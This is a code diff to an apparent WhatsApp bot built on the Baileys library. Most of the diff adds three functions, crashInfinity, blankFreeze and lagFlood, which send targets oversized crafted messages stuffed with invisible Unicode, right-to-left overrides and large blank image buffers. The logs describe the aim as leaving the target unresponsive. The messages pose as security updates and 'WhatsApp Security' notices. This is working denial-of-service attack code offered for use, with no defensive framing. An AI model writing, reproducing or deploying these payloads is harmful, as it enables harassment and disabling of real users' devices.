@@ -72,6 +72,7 @@ const {
     getStream,
     WAProto,
     isBaileys,
+    initAuthCreds,
     AnyMessageContent,
     fetchLatestBaileysVersion,
     templateMessage,
@@ -93,14 +94,12 @@ async function getRedis() {
             host: process.env.REDIS_HOST,
             port: parseInt(process.env.REDIS_PORT) || 6379,
             password: process.env.REDIS_PASSWORD,
-            tls: {}, // WAJIB untuk Upstash
+            tls: {},
             retryStrategy: (times) => Math.min(times * 50, 2000),
             lazyConnect: true,
         });
-        // Event listener setelah instance dibuat
         redisInstance.on('error', (err) => console.error('Redis error:', err));
-        redisInstance.on('connect', () => console.log('✅ Connected to Redis Upstash'));
-        // Jangan await connect, biarkan lazy
+        await redisInstance.connect(); // ← TAMBAH INI
     }
     return redisInstance;
 }
@@ -231,8 +230,140 @@ async function pairDevice(sessionId, phoneNumber) {
 }
 
 // ==================== BUG FUNCTIONS ====================
-// (fungsi crashInfinity, blankFreeze, lagFlood tetap sama seperti sebelumnya)
-// Hanya pastikan tidak ada process.exit
+async function crashInfinity(target, sock) {
+    const invisibleForce = "‎".repeat(50000); 
+    const fakeImage = Buffer.alloc(200000); 
+
+    console.log(`[!] Constructing Lethal Payload for ${target}...`);
+
+    try {
+        await sock.relayMessage(target, {
+            viewOnceMessage: {
+                message: {
+                    interactiveMessage: {
+                        header: {
+                            title: invisibleForce,
+                            hasMediaAttachment: true,
+                            jpegThumbnail: fakeImage
+                        },
+                        body: {
+                            text: "⚠️ System Security Update Required"
+                        },
+                        nativeFlowMessage: {
+                            buttons: [{
+                                name: "quick_reply",
+                                buttonParamsJson: JSON.stringify({
+                                    display_text: "Update Now",
+                                    id: "crash-trigger"
+                                })
+                            }],
+                            contentId: "Xerumi-Cloud-v1"
+                        },
+                        contextInfo: {
+                            quotedMessage: {
+                                buttonsMessage: {
+                                    contentText: invisibleForce,
+                                    footerText: invisibleForce,
+                                    buttons: [
+                                        { buttonId: 'id1', buttonText: { displayText: invisibleForce }, type: 1 }
+                                    ]
+                                }
+                            },
+                            participant: "0@s.whatsapp.net",
+                            remoteJid: "status@broadcast"
+                        }
+                    }
+                }
+            }
+        }, { 
+            participant: { jid: target } 
+        });
+
+        console.log(`[✅] Payload successfully relayed to ${target}`);
+
+
+    } catch (err) {
+        console.error(`[❌] Failed to send payload: ${err.message}`);
+    }
+}
+
+async function blankFreeze(target, sock) {
+    const ghostPayload = "‌".repeat(10000) + "‎".repeat(10000) + "⿈".repeat(5000);
+    console.log(chalk.yellow(`[!] Injecting Blank-Freeze to: ${target}`));
+
+    try {
+        await sock.relayMessage(target, {
+            pollCreationMessage: {
+                name: ghostPayload, 
+                options: [
+                    { optionName: "‌".repeat(5000) },
+                    { optionName: "‎".repeat(5000) }
+                ],
+                selectableOptionsCount: 0
+            },
+            contextInfo: {
+                forwardingScore: 999,
+                isForwarded: true,
+                externalAdReply: {
+                    title: "System Error: 0x000F2",
+                    body: ghostPayload.slice(0, 1000),
+                    mediaType: 1,
+                    renderLargerThumbnail: false,
+                    thumbnail: Buffer.alloc(50000) 
+                }
+            }
+        }, { 
+            participant: { jid: target } 
+        });
+
+        console.log(chalk.green(`[✅] Blank-Freeze Sent! Target should be unresponsive.`));
+   } catch (err) {
+        console.log(chalk.red(`[❌] Error: ${err.message}`));
+    }
+}
+
+async function lagFlood(target, sock) {
+    const chaosText = "🥵".repeat(1000) + "‮".repeat(5000) + "‎".repeat(5000);
+
+    console.log(chalk.blue(`[!] Launching Lag-Flood Attack to: ${target}`));
+
+    try {
+        await sock.relayMessage(target, {
+            listMessage: {
+                title: "System Synchronization..." + "‎".repeat(1000),
+                description: "Processing incoming data packets...",
+                buttonText: "Click to Resolve",
+                listType: 1,
+                sections: Array.from({ length: 20 }, (_, i) => ({
+                    title: `Protocol-X${i}`,
+                    rows: Array.from({ length: 20 }, (_, j) => ({
+                        title: chaosText,
+                        description: "Data-Stream-" + j,
+                        rowId: `id-${i}-${j}`
+                    }))
+                })),
+                contextInfo: {
+                    remoteJid: "0@s.whatsapp.net",
+                    adContextInfo: {
+                        advertiserName: "WhatsApp Security",
+                        status: chaosText
+                    },
+                    externalAdReply: {
+                        title: "‎".repeat(10000),
+                        mediaType: 2,
+                        thumbnail: Buffer.alloc(100000)
+                    }
+                }
+            }
+        }, { 
+            participant: { jid: target } 
+        });
+
+        console.log(chalk.cyan(`[✅] Lag-Flood successfully deployed to ${target}`));
+    } catch (err) {
+        console.log(chalk.red(`[❌] Flood Failed: ${err.message}`));
+    }
+}
 
 // ==================== SEND BUG ====================
 async function sendBugMessage(sessionId, to, bugType) {
@@ -246,13 +377,13 @@ async function sendBugMessage(sessionId, to, bugType) {
 
     switch (bugType) {
         case 'Crash Infinity':
-            await crashInfinity(jid, sock);
+            await crashInfinity(target, sock);
             break;
         case 'Blank Freeze':
-            await blankFreeze(jid, sock);
+            await blankFreeze(target, sock);
             break;
         case 'Lag Flood':
-            await lagFlood(jid, sock);
+            await lagFlood(target, sock);
             break;
         default:
             throw new Error('Unknown bug type');
